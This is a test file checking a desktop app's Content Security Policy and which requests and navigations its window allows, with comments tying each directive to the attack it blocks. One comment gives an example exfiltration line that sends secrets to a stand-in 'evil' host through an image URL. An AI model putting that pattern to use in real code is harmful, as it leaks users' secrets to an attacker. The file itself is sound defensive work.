import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  CONTENT_SECURITY_POLICY,
  isAllowedNavigation,
  isAllowedRequest,
} from '../src/main/security.js'

/**
 * The window's posture toward the network.
 *
 * These assertions look like they are testing a string constant, and in a sense
 * they are. The reason to write them down is that every one of these directives
 * is load-bearing for a specific attack, and a CSP is the kind of thing that
 * gets loosened one directive at a time by someone trying to make a font load.
 * Naming the attack next to the directive means the next person weighing that
 * trade knows what they are trading.
 */

const directive = (name: string): string | undefined =>
  CONTENT_SECURITY_POLICY.split('; ').find((d) => d.startsWith(`${name} `))

describe('the content security policy', () => {
  it('starts from nothing and adds back', () => {
    expect(CONTENT_SECURITY_POLICY.startsWith("default-src 'none'")).toBe(true)
  })

  // The renderer displays Jira summaries, PR titles, branch names and agent-written
  // note bodies. Any of them can contain markup, and this is the assumption that
  // one of them will one day reach the DOM unescaped.
  it('allows no remote script and no eval', () => {
    expect(directive('script-src')).toBe("script-src 'self'")
  })

  // The classic exfiltration route out of an injected script is not a script
  // tag — it is `new Image().src = 'https://evil/?' + secrets`. `connect-src`
  // closes fetch and websockets; `img-src` without a remote origin closes that.
  it('gives an injected script no way to reach the network', () => {
    expect(directive('connect-src')).toBe("connect-src 'none'")
    expect(directive('img-src')).toBe("img-src 'self' data:")
  })

  it('closes the embedding and base-URL routes', () => {
    expect(directive('object-src')).toBe("object-src 'none'")
    expect(directive('frame-ancestors')).toBe("frame-ancestors 'none'")
    expect(directive('base-uri')).toBe("base-uri 'none'")
    expect(directive('form-action')).toBe("form-action 'none'")
  })

  it('permits inline style but never inline script', () => {
    // React inline-styles a handful of computed values — a gauge width, a lane
    // height. That grants nothing to script-src, and the two are worth keeping
    // visibly separate.
    expect(directive('style-src')).toContain("'unsafe-inline'")
    expect(directive('script-src')).not.toContain("'unsafe-inline'")
    expect(CONTENT_SECURITY_POLICY).not.toContain('unsafe-eval')
  })
})

describe('what the window may load', () => {
  it('loads local files and the devtools', () => {
    expect(isAllowedRequest('file:///app/dist/renderer/index.html')).toBe(true)
    expect(isAllowedRequest('devtools://devtools/bundled/inspector.html')).toBe(true)
  })

  it('loads nothing over the network, including from the providers it polls', () => {
    for (const url of [
      'https://github.com/favicon.ico',
      'https://example.atlassian.net/avatar.png',
      'http://localhost:5173/app.js',
      'ws://localhost:5173/',
    ]) {
      expect(isAllowedRequest(url), url).toBe(false)
    }
  })

  // There is no dev server, and that is the reason this predicate is the same in
  // development as in production. A CSP that only holds when packaged is a CSP
  // nobody has been running all day.
  it('does not except a development server', () => {
    expect(isAllowedRequest('http://127.0.0.1:5173/index.html')).toBe(false)
  })
})

describe('where the window may navigate', () => {
  const here = 'file:///app/dist/renderer/index.html'

  it('permits only staying exactly where it is', () => {
    expect(isAllowedNavigation(here, here)).toBe(true)
  })

  it('refuses every navigation away, including to another local file', () => {
    for (const target of [
      'https://github.com/o/r/pull/1',
      'file:///app/dist/renderer/other.html',
      'file:///C:/Windows/System32/drivers/etc/hosts',
      'about:blank',
    ]) {
      expect(isAllowedNavigation(here, target), target).toBe(false)
    }
  })
})

describe('the policy in the document and the policy on the wire', () => {
  const html = readFileSync(
    join(dirname(fileURLToPath(import.meta.url)), '..', 'src', 'renderer', 'index.html'),
    'utf8',
  )

  // The header is what Chromium enforces; the meta tag is what someone opening
  // the file sees. They are allowed to differ only in `frame-ancestors`, which a
  // meta tag cannot express — so any *other* divergence is a policy that reads
  // one way and behaves another.
  it('agree, apart from the directive a meta tag cannot carry', () => {
    const meta = /content="([^"]+)"/.exec(html.slice(html.indexOf('Content-Security-Policy')))?.[1]
    const expected = CONTENT_SECURITY_POLICY.split('; ').filter(
      (d) => !d.startsWith('frame-ancestors'),
    )

    expect(meta?.split('; ')).toEqual(expected)
  })
})
